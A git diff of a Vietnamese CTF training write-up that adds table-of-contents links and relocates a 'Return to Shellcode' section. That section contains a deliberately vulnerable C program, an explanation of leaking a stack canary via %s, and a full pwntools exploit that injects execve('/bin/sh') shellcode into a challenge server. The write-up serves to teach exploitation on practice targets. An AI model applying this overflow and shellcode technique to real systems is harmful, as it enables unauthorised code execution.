@@ -1,7 +1,14 @@
 # Mục lục
+
 [basic_exploitation_000](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_000)
-
-
+[basic_exploitation_001](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_001)
+[shell_basic](https://github.com/wan-hyhty/trainning/tree/task-7#shell_basic)
+[Return address overflow](https://github.com/wan-hyhty/trainning/tree/task-7#return-address-overflow)
+[basic_exploitation_003](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_003)
+[out_of_bound](https://github.com/wan-hyhty/trainning/tree/task-7#out_of_bound)
+[Return to Shellcode](https://github.com/wan-hyhty/trainning/tree/task-7#return-to-shellcode)
+[basic_rop_x86](https://github.com/wan-hyhty/trainning/tree/task-7#basic_rop_x86)
+[]
 
 # basic_exploitation_000
 
@@ -661,6 +668,174 @@ r.interactive()
 
 ---
 
+# Return to Shellcode
+
+## source C
+
+<details> <summary> Source </summary>
+
+```c
+// Name: r2s.c
+// Compile: gcc -o r2s r2s.c -zexecstack
+
+#include <stdio.h>
+#include <unistd.h>
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+int main() {
+  char buf[0x50];
+
+  init();
+
+  printf("Address of the buf: %p\n", buf);
+  printf("Distance between buf and $rbp: %ld\n",
+         (char*)__builtin_frame_address(0) - buf);
+
+  printf("[1] Leak the canary\n");
+  printf("Input: ");
+  fflush(stdout);
+
+  read(0, buf, 0x100);
+  printf("Your input is '%s'\n", buf);
+
+  puts("[2] Overwrite the return address");
+  printf("Input: ");
+  fflush(stdout);
+  gets(buf);
+
+  return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây chương trình yêu cầu ta leak canary, ta thấy đoạn code này,
+
+```c
+  read(0, buf, 0x100);
+  printf("Your input is '%s'\n", buf);
+```
+
+- Ta hoàn toàn có thể leak được canary để lần nhập thứ 2 ta sẽ ghi lại canary và ow rip thành địa chỉ buf để thực thi shellcode (do NX tắt)
+
+> ý tưởng hơi lag =)), nên để em vừa thực thi vừa nêu lại ý tưởng =))
+
+## Thực thi
+
+### Leak canary
+
+- Đầu tiên chương trình yêu cầu ta leak canary, mà offset từ buf đến trước canary là 88, do đó ta sẽ ow đến trước canary xem %s có leak được canary cho ta ko
+
+![image](https://user-images.githubusercontent.com/111769169/227687986-04a30903-124a-4ca0-8455-f546c379c16b.png)
+
+- Tuy nhiên nó chăng leak cho canary
+
+![image](https://user-images.githubusercontent.com/111769169/227688887-501743d4-75d6-4bfc-ad75-e9ab6094647f.png)
+
+- Ta cần nhớ một lí thuyết về %s
+- %s sẽ in chuỗi đến khi gặp byte 0x00, ở đây khi in được 88 byte a nó gặp phải byte 0x00 của canary, nó sẽ ngừng in
+
+![image](https://user-images.githubusercontent.com/111769169/227689059-8267e3bf-1647-4d65-9445-cfb0ded8b02d.png)
+
+- Vậy mục tiêu của ta sẽ làm sao thay đổi byte 0x00 đó
+- Em chọn cách ghi đè 0x00 là byte 0x61 sau đó ta sẽ lấy giá trị leak được trừ đi 0x61 để trả lại byte 0x00
+- Ta sẽ nhập vào 89 byte a để ghi đè 0x00 của canary
+
+```python
+payload1 = b"a" * 89
+r.sendafter(b"Input: ", payload1)
+r.recvuntil(b"a" * 88)
+leak = u64(r.recv(8)) - 0x61
+log.info("leak canary " + hex(leak))
+```
+
+- Đây là những byte ta nhận được và ta sẽ nhận 8 byte được em tô, vì sao
+
+![image](https://user-images.githubusercontent.com/111769169/227689369-f98c7956-288e-422e-a674-bd6dec88d514.png)
+
+- Ta kiểm tra stack thì canary là `0x0e16b884a8303c61` đã bị thay đổi, ta dựa vào những byte không bị thay đổi để xác định
+
+### ret2shellcode
+
+- Ta đã có canary nên ta có thể ghi đè canary, ghi rip trở về buf trong stack để thực thi shellcode
+- Ta sẽ lấy địa chỉ stack của buf ban đầu chương trình cho, ghi shellcode vào đó
+
+```python
+shellcode = asm(
+    '''
+    mov rax, 0x3b
+    mov rdi, 29400045130965551
+    push rdi
+
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+
+    syscall
+    ''', arch='amd64'
+)
+payload2 = shellcode
+payload2 = payload2.ljust(88, b"a")
+payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
+r.sendlineafter(b"Input: ", payload2)
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227689895-4e3f0bdd-f844-4577-8970-1136687d9d18.png)
+
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+exe = ELF("./r2s_patched")
+r = remote("host3.dreamhack.games", 13430)
+# r = process("./r2s_patched")
+# gdb.attach(r, gdbscript='''
+#            b* main+159
+#            c
+#            ''')
+input()
+r.recvuntil(b"buf: ")
+leak_stack = int(r.recvline(keepends=False).decode(), 16)
+log.info("leak stack: " + hex(leak_stack))
+
+payload1 = b"a" * 89
+r.sendafter(b"Input: ", payload1)
+r.recvuntil(b"a" * 88)
+leak = u64(r.recv(8)) - 0x61
+log.info("leak canary " + hex(leak))
+
+shellcode = asm(
+    '''
+    mov rax, 0x3b
+    mov rdi, 29400045130965551
+    push rdi
+
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+
+    syscall
+    ''', arch='amd64'
+)
+payload2 = shellcode
+payload2 = payload2.ljust(88, b"a")
+payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
+r.sendlineafter(b"Input: ", payload2)
+
+r.interactive()
+
+```
+
+</detials>
+
 # basic_rop_x86
 
 ## source
@@ -830,174 +1005,6 @@ r.interactive()
 ```
 
 </details>
-
-# Return to Shellcode
-
-## source C
-
-<details> <summary> Source </summary>
-
-```c
-// Name: r2s.c
-// Compile: gcc -o r2s r2s.c -zexecstack
-
-#include <stdio.h>
-#include <unistd.h>
-
-void init() {
-  setvbuf(stdin, 0, 2, 0);
-  setvbuf(stdout, 0, 2, 0);
-}
-
-int main() {
-  char buf[0x50];
-
-  init();
-
-  printf("Address of the buf: %p\n", buf);
-  printf("Distance between buf and $rbp: %ld\n",
-         (char*)__builtin_frame_address(0) - buf);
-
-  printf("[1] Leak the canary\n");
-  printf("Input: ");
-  fflush(stdout);
-
-  read(0, buf, 0x100);
-  printf("Your input is '%s'\n", buf);
-
-  puts("[2] Overwrite the return address");
-  printf("Input: ");
-  fflush(stdout);
-  gets(buf);
-
-  return 0;
-}
-```
-
-</details>
-
-## Ý tưởng
-
-- Ở đây chương trình yêu cầu ta leak canary, ta thấy đoạn code này,
-
-```c
-  read(0, buf, 0x100);
-  printf("Your input is '%s'\n", buf);
-```
-
-- Ta hoàn toàn có thể leak được canary để lần nhập thứ 2 ta sẽ ghi lại canary và ow rip thành địa chỉ buf để thực thi shellcode (do NX tắt)
-
-> ý tưởng hơi lag =)), nên để em vừa thực thi vừa nêu lại ý tưởng =))
-
-## Thực thi
-
-### Leak canary
-
-- Đầu tiên chương trình yêu cầu ta leak canary, mà offset từ buf đến trước canary là 88, do đó ta sẽ ow đến trước canary xem %s có leak được canary cho ta ko
-
-![image](https://user-images.githubusercontent.com/111769169/227687986-04a30903-124a-4ca0-8455-f546c379c16b.png)
-
-- Tuy nhiên nó chăng leak cho canary
-
-![image](https://user-images.githubusercontent.com/111769169/227688887-501743d4-75d6-4bfc-ad75-e9ab6094647f.png)
-
-- Ta cần nhớ một lí thuyết về %s
-- %s sẽ in chuỗi đến khi gặp byte 0x00, ở đây khi in được 88 byte a nó gặp phải byte 0x00 của canary, nó sẽ ngừng in
-
-![image](https://user-images.githubusercontent.com/111769169/227689059-8267e3bf-1647-4d65-9445-cfb0ded8b02d.png)
-
-- Vậy mục tiêu của ta sẽ làm sao thay đổi byte 0x00 đó
-- Em chọn cách ghi đè 0x00 là byte 0x61 sau đó ta sẽ lấy giá trị leak được trừ đi 0x61 để trả lại byte 0x00
-- Ta sẽ nhập vào 89 byte a để ghi đè 0x00 của canary
-
-```python
-payload1 = b"a" * 89
-r.sendafter(b"Input: ", payload1)
-r.recvuntil(b"a" * 88)
-leak = u64(r.recv(8)) - 0x61
-log.info("leak canary " + hex(leak))
-```
-
-- Đây là những byte ta nhận được và ta sẽ nhận 8 byte được em tô, vì sao
-
-![image](https://user-images.githubusercontent.com/111769169/227689369-f98c7956-288e-422e-a674-bd6dec88d514.png)
-
-- Ta kiểm tra stack thì canary là `0x0e16b884a8303c61` đã bị thay đổi, ta dựa vào những byte không bị thay đổi để xác định
-
-### ret2shellcode
-
-- Ta đã có canary nên ta có thể ghi đè canary, ghi rip trở về buf trong stack để thực thi shellcode
-- Ta sẽ lấy địa chỉ stack của buf ban đầu chương trình cho, ghi shellcode vào đó
-
-```python
-shellcode = asm(
-    '''
-    mov rax, 0x3b
-    mov rdi, 29400045130965551
-    push rdi
-
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
-
-    syscall
-    ''', arch='amd64'
-)
-payload2 = shellcode
-payload2 = payload2.ljust(88, b"a")
-payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
-r.sendlineafter(b"Input: ", payload2)
-```
-
-## Kết quả
-
-![image](https://user-images.githubusercontent.com/111769169/227689895-4e3f0bdd-f844-4577-8970-1136687d9d18.png)
-
-<details> <summary> full script </summary>
-
-```python
-from pwn import *
-exe = ELF("./r2s_patched")
-r = remote("host3.dreamhack.games", 13430)
-# r = process("./r2s_patched")
-# gdb.attach(r, gdbscript='''
-#            b* main+159
-#            c
-#            ''')
-input()
-r.recvuntil(b"buf: ")
-leak_stack = int(r.recvline(keepends=False).decode(), 16)
-log.info("leak stack: " + hex(leak_stack))
-
-payload1 = b"a" * 89
-r.sendafter(b"Input: ", payload1)
-r.recvuntil(b"a" * 88)
-leak = u64(r.recv(8)) - 0x61
-log.info("leak canary " + hex(leak))
-
-shellcode = asm(
-    '''
-    mov rax, 0x3b
-    mov rdi, 29400045130965551
-    push rdi
-
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
-
-    syscall
-    ''', arch='amd64'
-)
-payload2 = shellcode
-payload2 = payload2.ljust(88, b"a")
-payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
-r.sendlineafter(b"Input: ", payload2)
-
-r.interactive()
-
-```
-
-</detials>
 
 # basic_rop_x64
 
